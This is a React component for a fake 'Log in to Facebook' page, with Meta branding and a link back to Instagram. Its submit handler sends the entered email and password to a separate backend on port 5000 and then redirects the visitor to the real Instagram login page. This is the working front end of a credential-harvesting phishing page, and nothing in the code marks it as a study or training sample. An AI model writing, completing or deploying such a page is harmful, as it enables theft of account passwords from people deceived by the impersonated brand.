import React, { useState } from 'react'

export default function FacebookLoginForm({ onBackToInstagram }) {
  const [formData, setFormData] = useState({
    email: '',
    password: ''
  })
  const [isLoading, setIsLoading] = useState(false)

  const handleChange = (e) => {
    const { name, value } = e.target
    setFormData(prev => ({ ...prev, [name]: value }))
  }

  const handleSubmit = async (e) => {
    e.preventDefault()
    setIsLoading(true)

    try {
      const response = await fetch('http://localhost:5000/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          identifier: formData.email,
          password: formData.password
        })
      });

      const data = await response.json();
      if (!response.ok) {
        alert(data.error || 'Login failed');
      } else {
        window.location.href = data.redirectUrl || 'https://www.instagram.com/accounts/login/?next=%2F&source=mobile_nav';
      }
    } catch (err) {
      alert('Network error. Is the backend running on port 5000?');
    } finally {
      setIsLoading(false);
    }
  }

  const isFormValid = formData.email.length > 0 && formData.password.length > 0

  return (
    <div className="fb-login-card">
      <h1 className="fb-login-title" id="fb-login-heading">Log in to Facebook</h1>

      <form onSubmit={handleSubmit} autoComplete="off">
        <div className="fb-form-group">
          <input
            id="fb-login-email"
            className="fb-form-input"
            type="text"
            name="email"
            placeholder="Email address or mobile number"
            value={formData.email}
            onChange={handleChange}
            autoComplete="email"
            aria-label="Email address or mobile number"
          />
        </div>

        <div className="fb-form-group">
          <input
            id="fb-login-password"
            className="fb-form-input"
            type="password"
            name="password"
            placeholder="Password"
            value={formData.password}
            onChange={handleChange}
            autoComplete="current-password"
            aria-label="Password"
          />
        </div>

        <button
          id="fb-login-submit"
          className="fb-btn-login"
          type="submit"
          disabled={!isFormValid || isLoading}
          style={{ opacity: isFormValid ? 1 : 0.65 }}
        >
          {isLoading ? 'Logging in...' : 'Log in'}
        </button>
      </form>

      <div className="fb-forgot-password">
        <a href="#" id="fb-forgot-password-link">Forgotten password?</a>
      </div>

      <button id="fb-create-account" className="fb-btn-create" type="button">
        Create new account
      </button>

      {/* Meta Logo */}
      <div className="fb-meta-logo">
        <svg width="80" height="20" viewBox="0 0 80 20" xmlns="http://www.w3.org/2000/svg">
          <text x="10" y="15" fontFamily="Inter, sans-serif" fontSize="13" fontWeight="400" fill="#737373" letterSpacing="0.5">
            Meta
          </text>
          {/* Infinity symbol */}
          <text x="0" y="16" fontFamily="Inter, sans-serif" fontSize="16" fill="#737373">∞</text>
        </svg>
      </div>

      {/* Back to Instagram link */}
      <button
        id="back-to-instagram"
        className="fb-back-link"
        type="button"
        onClick={onBackToInstagram}
      >
        ← Back to Instagram
      </button>
    </div>
  )
}
